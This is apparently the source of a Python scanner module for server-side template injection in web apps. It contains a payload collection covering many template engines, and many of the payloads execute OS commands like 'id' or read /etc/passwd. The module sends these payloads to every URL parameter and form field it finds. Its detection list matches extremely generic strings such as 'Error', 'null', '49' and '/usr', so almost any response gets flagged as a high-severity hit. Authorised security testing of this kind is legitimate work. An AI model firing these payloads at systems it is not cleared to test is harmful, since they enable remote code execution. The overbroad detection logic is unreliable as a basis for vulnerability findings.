import logging
from urllib.parse import urlparse, parse_qs, quote
from ..http_client import HttpClient
import re
from typing import List, Dict, Optional, Union

logger = logging.getLogger(__name__)

class SSTIScanner:
    def __init__(self, client=None):
        self.client = client if client else HttpClient()
        
        # Patterns to detect successful SSTI exploitation
        self.ssti_patterns = [
            # Basic math expressions results
            r"49",                                # 7*7=49
            r"7777777",                           # 7*'7'='7777777'
            
            # Command execution outputs
            r"uid=\d+\(\w+\) gid=\d+\(\w+\)",    # id command output
            r"root:.*:0:0:",                      # /etc/passwd
            r"\d+\s+\d+\s+\w+\s+\w+\s+\d+\s+\w+\s+\d+",  # ls -la output
            r"Directory of",                      # dir command output
            r"Volume in drive [A-Z] is",          # dir command output
            
            # Template engine specific outputs
            r"<Config\s+",                        # Flask/Jinja2 config dump
            r"<EnvironBuilder\s+",                # Flask/Jinja2 request
            r"<Request\s+",                       # Flask/Jinja2 request
            r"<Flask\s+",                         # Flask application
            r"<Werkzeug\s+",                      # Werkzeug (Flask)
            r"<module\s+'os'\s+",                 # Python os module
            r"<class\s+'.*'\s+",                  # Python class
            r"<type\s+'.*'\s+",                   # Python type
            r"<function\s+.*\s+at\s+0x",          # Python function
            r"<bound method\s+.*\s+of\s+",        # Python bound method
            
            # Java specific outputs
            r"java\.lang\.Runtime",
            r"java\.io\.File",
            r"java\.util\.ArrayList",
            r"java\.util\.HashMap",
            r"java\.util\.Properties",
            r"java\.lang\.ProcessBuilder",
            r"java\.lang\.ClassLoader",
            
            # Ruby specific outputs
            r"<Proc:",
            r"<IO:",
            r"<File:",
            r"<Dir:",
            r"<Process:",
            
            # Environment variables
            r"(PATH|HOME|USER|SHELL|PWD|LOGNAME|JAVA_HOME|TEMP|TMP)=",
            
            # Error messages that might reveal SSTI
            r"Template syntax error",
            r"Liquid error:",
            r"Liquid syntax error:",
            r"Twig_Error_Syntax:",
            r"Parse error: syntax error",
            r"Django template error:",
            r"Error compiling template:",
            r"org\.springframework\.expression\.spel\.SpelEvaluationException",
            r"freemarker\.core\.ParseException",
            r"org\.apache\.velocity\.exception",
            r"javax\.el\.ELException",
            r"org\.thymeleaf\.exceptions",
            r"Smarty error:",
            r"Handlebars\.Exception",
            r"Error: Parse error on line \d+:",
            r"RazorEngine\.Templating\.TemplateCompilationException",
            r"RuntimeError:",                     # Python runtime error
            r"\{\{.*\}\}",                        # Unprocessed template
            r"<\?xml",                           # XML output
            r"java\.lang",                        # Java class
            r"Exception",                         # Generic exception
            r"Traceback",                         # Python traceback
            r"Error",                             # Generic error
            r"Warning",                           # Generic warning
            r"undefined",                         # JavaScript undefined
            r"null",                              # JavaScript null
            r"NaN",                               # JavaScript NaN
            r"\[object Object\]",                 # JavaScript object
            r"Uncaught SyntaxError: Unexpected token",
            
            # File system information
            r"(\/bin|\/etc|\/home|\/mnt|\/opt|\/root|\/srv|\/tmp|\/usr|\/var)",
            r"(C:\\Windows|C:\\Program Files|C:\\Users|C:\\ProgramData)"
        ]
        
        # Payloads for SSTI testing across different template engines
        self.payloads = [
            # Basic math expressions (work in many engines)
            "${7*7}",
            "{{7*7}}",
            "#{7*7}",
            "<%= 7*7 %>",
            "{7*7}",
            "${{7*7}}",
            "#{7*7}#",
            "*{7*7}",
            
            # Jinja2/Twig (Python/PHP)
            "{{7*'7'}}",
            "{{config}}",
            "{{config.items()}}",
            "{{request}}",
            "{{request.environ}}",
            "{{self}}",
            "{{self.__dict__}}",
            "{{url_for.__globals__}}",
            "{{url_for.__globals__['current_app']}}",
            "{{url_for.__globals__.__builtins__}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}",
            
            # ERB (Ruby)
            "<%= system('id') %>",
            "<%= Dir.entries('/') %>",
            "<%= File.open('/etc/passwd').read %>",
            "<%= `id` %>",
            "<%= IO.popen('id').readlines() %>",
            "<%= require 'open3'; Open3.capture2('id') %>",
            "<%= eval('7*7') %>",
            
            # Freemarker (Java)
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            "${7*7}",
            "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
            "${product.getClass().getProtectionDomain().getCodeSource().getLocation()}",
            "${product.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")}",
            
            # Velocity (Java)
            "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
            
            # Handlebars (JavaScript)
            "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.push (lookup string.constructor.prototype.toString)}}{{this.push \"constructor\"}}{{this.push \"call\"}}{{this.push \"return process.mainModule.require('child_process').execSync('id')\"}}{{#each conslist}}{{#with (string.constructor.constructor this)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}",
            
            # Smarty (PHP)
            "{php}echo `id`;{/php}",
            "{php}system('id');{/php}",
            "{php}passthru('id');{/php}",
            "{php}echo shell_exec('id');{/php}",
            "{php}echo file_get_contents('/etc/passwd');{/php}",
            
            # Pug/Jade (Node.js)
            "#{ 7 * 7 }",
            "#{process.mainModule.require('child_process').execSync('id')}",
            
            # Django (Python)
            "{% debug %}",
            "{% load module %}",
            "{% include request.GET.template_name %}",
            "{% extends request.GET.template_name %}",
            
            # Thymeleaf (Java)
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "${T(java.lang.System).getenv()}",
            "${T(java.lang.ClassLoader).getSystemClassLoader()}",
            
            # Razor (C#)
            "@(7*7)",
            "@{// C# code}",
            "@System.Diagnostics.Process.Start(\"cmd.exe\",\"/c id\")",
            
            # Mako (Python)
            "${7*7}",
            "<%\nimport os\nos.popen('id').read()\n%>",
            
            # Mustache (Various)
            "{{=<% %>=}}<%7*7%>",
            
            # Dot.js (Node.js)
            "{{=it.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}",
            
            # Liquid (Ruby)
            "{% assign x = 7 | times: 7 %}{{x}}",
            
            # Special cases
            "${{<%[%\"'}}%\\",
            "{{<%[%\"'}}%\\",
            "{{7*'7'}} = {{7*7}}",
            "${7*'7'} = ${7*7}",
            "<%= 7*'7' %> = <%= 7*7 %>",
            "{{config.items()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
        ]

    def scan(self, url: str, forms: Optional[List[Dict]] = None) -> List[Dict]:
        vulnerabilities = []
        
        try:
            # Check URL parameters
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if params:
                for param in params:
                    for payload in self.payloads:
                        try:
                            test_url = self._inject_payload(url, param, payload)
                            response = self.client.get(test_url, timeout=5)
                            
                            if response and self._is_vulnerable(response.text, payload):
                                vulnerabilities.append({
                                    'type': 'SSTI',
                                    'url': test_url,
                                    'payload': payload,
                                    'evidence': self._get_evidence(response.text, payload),
                                    'severity': 'high',
                                    'param': param,
                                    'method': 'GET'
                                })
                        except Exception as e:
                            logger.error(f"SSTI GET scan error for {url}: {str(e)}")
            
            # Check forms
            if forms:
                for form in forms:
                    try:
                        form_fields = form.get('fields', [])
                        if not isinstance(form_fields, list):
                            logger.warning(f"Invalid form fields type: {type(form_fields)}")
                            continue
                        
                        method = form.get('method', 'POST').upper()
                        action = form.get('action', '')
                        if not action:
                            logger.warning("Form has no action URL")
                            continue
                        
                        for field in form_fields:
                            field_name = field.get('name') if isinstance(field, dict) else field
                            
                            for payload in self.payloads:
                                try:
                                    test_data = {}
                                    for f in form_fields:
                                        f_name = f.get('name') if isinstance(f, dict) else f
                                        test_data[f_name] = payload if f_name == field_name else 'test'
                                    
                                    if method == 'POST':
                                        response = self.client.post(action, data=test_data, timeout=5)
                                    elif method == 'GET':
                                        response = self.client.get(action, params=test_data, timeout=5)
                                    else:
                                        logger.warning(f"Unsupported form method: {method}")
                                        continue
                                    
                                    if response and self._is_vulnerable(response.text, payload):
                                        vulnerabilities.append({
                                            'type': 'SSTI',
                                            'url': action,
                                            'payload': payload,
                                            'evidence': self._get_evidence(response.text, payload),
                                            'severity': 'high',
                                            'param': field_name,
                                            'method': method
                                        })
                                except Exception as e:
                                    logger.error(f"SSTI form scan error for field {field_name}: {str(e)}")
                    except Exception as e:
                        logger.error(f"SSTI form scan error: {str(e)}")
        
        except Exception as e:
            logger.error(f"SSTI scan error: {str(e)}")
        
        return vulnerabilities

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        new_query = '&'.join(f"{k}={quote(v[0])}" for k, v in query.items())
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

    def _is_vulnerable(self, response_text: str, payload: str) -> bool:
        # Check for patterns that indicate successful SSTI
        for pattern in self.ssti_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
                
        # Additional checks for specific payloads
        if "7*7" in payload and "49" in response_text:
            return True
            
        if "7*'7'" in payload and "7777777" in response_text:
            return True
            
        if "id" in payload and re.search(r"uid=\d+\(\w+\) gid=\d+\(\w+\)", response_text):
            return True
            
        if "passwd" in payload and ("root:" in response_text or "nobody:" in response_text):
            return True
            
        return False

    def _get_evidence(self, response_text: str, payload: str) -> str:
        # Extract evidence of SSTI vulnerability
        for pattern in self.ssti_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return f"SSTI pattern detected: {match.group(0)}"
                
        # If we couldn't find a specific pattern but determined it's vulnerable
        if "7*7" in payload and "49" in response_text:
            return "Math expression evaluated: 7*7=49"
                
        if "7*'7'" in payload and "7777777" in response_text:
            return "String multiplication evaluated: 7*'7'=7777777"
                
        if "id" in payload and re.search(r"uid=\d+\(\w+\) gid=\d+\(\w+\)", response_text):
            return "Command output leaked: id command"
                
        if "passwd" in payload and ("root:" in response_text or "nobody:" in response_text):
            return "File content leaked: /etc/passwd"
                
        return "SSTI vulnerability detected through response analysis"
